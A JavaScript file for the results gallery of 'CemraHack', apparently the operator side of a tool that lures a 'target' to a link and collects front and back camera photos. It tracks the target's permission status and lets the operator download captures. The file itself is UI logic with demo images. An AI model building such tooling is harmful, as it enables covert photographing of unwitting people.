/* ================================================
   RESULTS.JS — Gallery Page Logic (CemraHack)
   ================================================ */

// ---- State ----
let allPhotos = [];        // all captured photo objects
let filtered = [];        // after filter/search
let currentView = 'grid';
let lightboxIdx = -1;
let currentFilter = 'all';
let sessionId = null;

// ---- Sample demo images (real camera captures would replace these) ----
const DEMO_COUNT = 6; // Start with 6 demo captures for UI demonstration

// ---- On Load ----
window.addEventListener('DOMContentLoaded', () => {
    // Grab session from URL or localStorage
    const params = new URLSearchParams(window.location.search);
    sessionId = params.get('s') || localStorage.getItem('cemra_session') || 'DEMO-0000-0000-0000';
    document.getElementById('resultsSessionId').textContent = sessionId;

    // Mark step 1 as done (link was already generated)
    markStep(1, true);

    // Load any saved captures from localStorage
    loadCaptures();

    // Poll for new captures and status every 2 seconds (simulates real-time)
    setInterval(() => {
        pollCaptures();
        pollStatus();
    }, 2000);
});

// ---- Mark a waiting step as complete ----
function markStep(stepNum, done) {
    const el = document.getElementById('wStep' + stepNum);
    if (!el) return;
    el.classList.remove('pending');
    el.querySelector('i').className = done
        ? 'fa-solid fa-check-circle'
        : 'fa-regular fa-circle';
}

// ---- Load captures from localStorage (saved by capture.html) ----
function loadCaptures() {
    const raw = localStorage.getItem('cemra_captures_' + sessionId);
    if (raw) {
        try {
            allPhotos = JSON.parse(raw);
        } catch { allPhotos = []; }
    }

    // If no real captures, generate demo captures for UI demo
    if (allPhotos.length === 0) {
        allPhotos = generateDemoPhotos(DEMO_COUNT);
    } else {
        // If real captures exist, hide the waiting state immediately
        document.getElementById('waitingState').classList.add('hidden');
    }

    updateGallery();
}

// ---- Poll for new captures (simulates live updates) ----
function pollCaptures() {
    const raw = localStorage.getItem('cemra_captures_' + sessionId);
    if (!raw) return;
    try {
        const fresh = JSON.parse(raw);
        const realPhotos = fresh.filter(p => !p.demo);
        if (realPhotos.length > allPhotos.filter(p => !p.demo).length) {
            // New captures arrived
            allPhotos = [...allPhotos.filter(p => p.demo), ...realPhotos];

            // If we have real photos, hide the demo ones and the waiting state
            if (realPhotos.length > 0) {
                allPhotos = realPhotos; // replace entirely with real ones
                document.getElementById('waitingState').classList.add('hidden');
            }

            updateGallery();
            showToast('New capture received!');
        }
    } catch { }
}

// ---- Poll for target status (Saved in capture.html) ----
function pollStatus() {
    const raw = localStorage.getItem('cemra_status_' + sessionId);
    if (!raw) return;
    try {
        const data = JSON.parse(raw);
        const status = data.status;

        // Sync UI steps
        if (status === 'connected' || status === 'permission_granted' || status === 'capturing' || status === 'done') markStep(2, true);
        if (status === 'permission_granted' || status === 'capturing' || status === 'done') markStep(3, true);
        if (status === 'done') markStep(4, true);

        // If capturing or done, ensure waiting state is progressing or hidden
        if (status === 'capturing' || status === 'done') {
            // Optional: add a "Capturing..." label to the radar if you want
        }
    } catch { }
}

// ---- Generate demo photo objects for UI illustration ----
function generateDemoPhotos(count) {
    const cameras = ['front', 'back'];
    const photos = [];
    for (let i = 0; i < count; i++) {
        const camera = cameras[i % 2];
        const d = new Date(Date.now() - (count - i) * 8000);
        photos.push({
            id: 'demo_' + i,
            src: `https://picsum.photos/seed/${sessionId + i}/640/480`,
            camera,
            time: d.toISOString(),
            size: (Math.random() * 2 + 0.5).toFixed(1) + ' MB',
            session: sessionId,
            demo: true
        });
    }
    return photos;
}

// ---- Update gallery render ----
function updateGallery() {
    const count = allPhotos.filter(p => !p.demo).length + allPhotos.filter(p => p.demo).length;
    document.getElementById('captureCount').textContent = count;

    if (count > 0) {
        const isReal = allPhotos.some(p => !p.demo);
        if (isReal) {
            document.getElementById('waitingState').classList.add('hidden');
            markStep(2, true);
            markStep(3, true);
            markStep(4, true);
        }
    }

    applyFilter(currentFilter);
}

// ---- Apply filter & render ----
function applyFilter(type) {
    currentFilter = type;
    const search = (document.getElementById('searchInput')?.value || '').toLowerCase();

    filtered = allPhotos.filter(photo => {
        const matchFilter = type === 'all' || photo.camera === type;
        const matchSearch = !search ||
            photo.time.toLowerCase().includes(search) ||
            photo.session.toLowerCase().includes(search);
        return matchFilter && matchSearch;
    });

    renderGallery();
}

// ---- Render gallery cards ----
function renderGallery() {
    const gallery = document.getElementById('gallery');
    gallery.innerHTML = '';

    filtered.forEach((photo, idx) => {
        const card = document.createElement('div');
        card.className = 'photo-card';
        card.setAttribute('data-idx', idx);
        card.onclick = () => openLightbox(idx);

        const timeStr = new Date(photo.time).toLocaleString();
        const camLabel = photo.camera === 'front' ? 'Front Camera' : 'Back Camera';

        card.innerHTML = `
      <div class="photo-img-wrap">
        <img src="${photo.src}" alt="Capture" loading="lazy" />
        <div class="camera-badge ${photo.camera}">${camLabel}</div>
        <div class="photo-overlay">
          <button class="photo-overlay-btn" onclick="event.stopPropagation(); downloadPhoto('${photo.id}')">
            <i class="fa-solid fa-download"></i>
          </button>
        </div>
      </div>
      <div class="photo-meta">
        <span class="photo-time"><i class="fa-regular fa-clock"></i> ${timeStr}</span>
        <span class="photo-size">${photo.size}</span>
      </div>
    `;
        gallery.appendChild(card);
    });

    // Stagger animation delays
    gallery.querySelectorAll('.photo-card').forEach((c, i) => {
        c.style.animationDelay = (i * 0.06) + 's';
    });
}

// ---- Filter buttons ----
function filterImages(type, btn) {
    document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    applyFilter(type);
}

// ---- Search ----
function searchImages() {
    applyFilter(currentFilter);
}

// ---- Toggle view mode ----
function setView(mode) {
    currentView = mode;
    const gallery = document.getElementById('gallery');
    gallery.classList.toggle('list-view', mode === 'list');
    document.getElementById('viewGrid').classList.toggle('active', mode === 'grid');
    document.getElementById('viewList').classList.toggle('active', mode === 'list');
}

// ---- Download all ----
function downloadAll() {
    if (filtered.length === 0) { showToast('No photos to download'); return; }
    showToast(`Downloading ${filtered.length} photo(s)...`);
    // In a real app, this would zip and download
    filtered.forEach((photo, i) => {
        setTimeout(() => {
            const a = document.createElement('a');
            a.href = photo.src;
            a.download = `cemra_${photo.session}_${i + 1}.jpg`;
            a.target = '_blank';
            a.click();
        }, i * 300);
    });
}

// ---- Download single ----
function downloadPhoto(id) {
    const photo = allPhotos.find(p => p.id === id);
    if (!photo) return;
    const a = document.createElement('a');
    a.href = photo.src; a.download = `cemra_${id}.jpg`; a.target = '_blank';
    a.click();
    showToast('Photo downloaded!');
}

function downloadSingle() {
    if (lightboxIdx < 0 || lightboxIdx >= filtered.length) return;
    downloadPhoto(filtered[lightboxIdx].id);
}

// ---- Clear all ----
function clearAll() {
    if (!confirm('Clear all captures for this session?')) return;
    allPhotos = [];
    filtered = [];
    localStorage.removeItem('cemra_captures_' + sessionId);
    document.getElementById('gallery').innerHTML = '';
    document.getElementById('captureCount').textContent = '0';
    document.getElementById('waitingState').classList.remove('hidden');
    showToast('All captures cleared');
}

// ---- Lightbox ----
function openLightbox(idx) {
    if (idx < 0 || idx >= filtered.length) return;
    lightboxIdx = idx;
    renderLightbox();
    document.getElementById('lightbox').classList.add('open');
    document.body.style.overflow = 'hidden';
}

function closeLightbox() {
    document.getElementById('lightbox').classList.remove('open');
    document.body.style.overflow = '';
}

function renderLightbox() {
    const photo = filtered[lightboxIdx];
    if (!photo) return;
    document.getElementById('lbImage').src = photo.src;
    document.getElementById('lbTime').innerHTML = `<i class="fa-regular fa-clock"></i> ${new Date(photo.time).toLocaleString()}`;
    document.getElementById('lbCamera').innerHTML = `<i class="fa-solid fa-camera"></i> ${photo.camera === 'front' ? 'Front Camera' : 'Back Camera'}`;
    document.getElementById('lbSession').innerHTML = `<i class="fa-solid fa-fingerprint"></i> ${photo.session}`;
}

function lightboxPrev() {
    if (lightboxIdx > 0) { lightboxIdx--; renderLightbox(); }
}
function lightboxNext() {
    if (lightboxIdx < filtered.length - 1) { lightboxIdx++; renderLightbox(); }
}

// Keyboard navigation
document.addEventListener('keydown', e => {
    const lb = document.getElementById('lightbox');
    if (!lb.classList.contains('open')) return;
    if (e.key === 'ArrowLeft') lightboxPrev();
    if (e.key === 'ArrowRight') lightboxNext();
    if (e.key === 'Escape') closeLightbox();
});

// ---- Toast ----
function showToast(msg) {
    const toast = document.getElementById('toast');
    document.getElementById('toastMsg').textContent = msg;
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 3000);
}
